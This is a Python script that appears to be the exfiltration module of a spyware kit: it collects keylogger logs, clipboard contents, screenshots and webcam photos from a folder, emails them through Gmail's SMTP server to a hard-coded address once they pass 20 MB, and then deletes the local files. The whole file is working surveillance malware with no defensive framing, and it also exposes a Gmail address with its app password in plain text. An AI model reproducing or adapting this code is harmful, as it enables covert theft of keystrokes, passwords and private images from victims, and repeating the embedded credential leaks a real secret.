import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Gmail credentials
EMAIL_ADDRESS = "timedahoodie@gmail.com"  # Replace with your Gmail address
EMAIL_PASSWORD = "qdok dyzh pqii dstn"  # Replace with your Gmail App Password

# Paths
SHARED_FOLDER = r"C:\Users\UTB\source\repos\SPYSEE"
KEYLOG_FILE = os.path.join(SHARED_FOLDER, "keylog.txt")
CLIPBOARD_FILE = os.path.join(SHARED_FOLDER, "clipboard.txt")
SCREENSHOTS_FOLDER = os.path.join(SHARED_FOLDER, "screenshots")
CAMERA_PICS_FOLDER = os.path.join(SHARED_FOLDER, "camera_pics")

# Size limit (20 MB)
SIZE_LIMIT = 20 * 1024 * 1024  # 20 MB in bytes


def send_email():
    try:
        # Create email
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = f"Keylogger Logs - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        # Add keylog content
        if os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, "r") as f:
                keylog_content = f.read()
            msg.attach(MIMEText(f"Keylog Data:\n\n{keylog_content}", "plain"))
        else:
            msg.attach(MIMEText("Keylog file not found.", "plain"))

        # Add clipboard content
        if os.path.exists(CLIPBOARD_FILE):
            with open(CLIPBOARD_FILE, "r") as f:
                clipboard_content = f.read()
            msg.attach(MIMEText(f"\n\nClipboard Data:\n\n{clipboard_content}", "plain"))
        else:
            msg.attach(MIMEText("\n\nClipboard file not found.", "plain"))

        # Attach screenshots
        attach_files(msg, SCREENSHOTS_FOLDER)

        # Attach camera pictures
        attach_files(msg, CAMERA_PICS_FOLDER)

        # Send email
        print("Connecting to Gmail SMTP server...")
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        print("Sending email...")
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
        server.quit()
        print("Email sent successfully.")

        # Clear files after sending
        clear_files()

    except Exception as e:
        print(f"Failed to send email: {e}")


def attach_files(msg, folder_path):
    """Attach files from a folder to the email."""
    if os.path.exists(folder_path):
        for file in os.listdir(folder_path):
            file_path = os.path.join(folder_path, file)
            if os.path.isfile(file_path):
                attach_file(msg, file_path)


def attach_file(msg, file_path):
    """Attach a single file to the email."""
    try:
        with open(file_path, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
        msg.attach(part)
    except Exception as e:
        print(f"Failed to attach file {file_path}: {e}")


def calculate_total_size():
    """Calculate the total size of all files."""
    total_size = 0

    # Add size of keylog file
    if os.path.exists(KEYLOG_FILE):
        total_size += os.path.getsize(KEYLOG_FILE)

    # Add size of clipboard file
    if os.path.exists(CLIPBOARD_FILE):
        total_size += os.path.getsize(CLIPBOARD_FILE)

    # Add size of screenshots
    if os.path.exists(SCREENSHOTS_FOLDER):
        for file in os.listdir(SCREENSHOTS_FOLDER):
            file_path = os.path.join(SCREENSHOTS_FOLDER, file)
            if os.path.isfile(file_path):
                total_size += os.path.getsize(file_path)

    # Add size of camera pictures
    if os.path.exists(CAMERA_PICS_FOLDER):
        for file in os.listdir(CAMERA_PICS_FOLDER):
            file_path = os.path.join(CAMERA_PICS_FOLDER, file)
            if os.path.isfile(file_path):
                total_size += os.path.getsize(file_path)

    return total_size


def clear_files():
    """Clear the contents of files and delete attachments."""
    # Clear keylog file
    if os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, "w") as f:
            f.truncate(0)

    # Clear clipboard file
    if os.path.exists(CLIPBOARD_FILE):
        with open(CLIPBOARD_FILE, "w") as f:
            f.truncate(0)

    # Delete screenshots
    if os.path.exists(SCREENSHOTS_FOLDER):
        for file in os.listdir(SCREENSHOTS_FOLDER):
            file_path = os.path.join(SCREENSHOTS_FOLDER, file)
            if os.path.isfile(file_path):
                os.remove(file_path)

    # Delete camera pictures
    if os.path.exists(CAMERA_PICS_FOLDER):
        for file in os.listdir(CAMERA_PICS_FOLDER):
            file_path = os.path.join(CAMERA_PICS_FOLDER, file)
            if os.path.isfile(file_path):
                os.remove(file_path)


if __name__ == "__main__":
    # Check if total size exceeds the limit
    if calculate_total_size() > SIZE_LIMIT:
        send_email()
    else:
        print("Total size is below the limit. No email sent.")
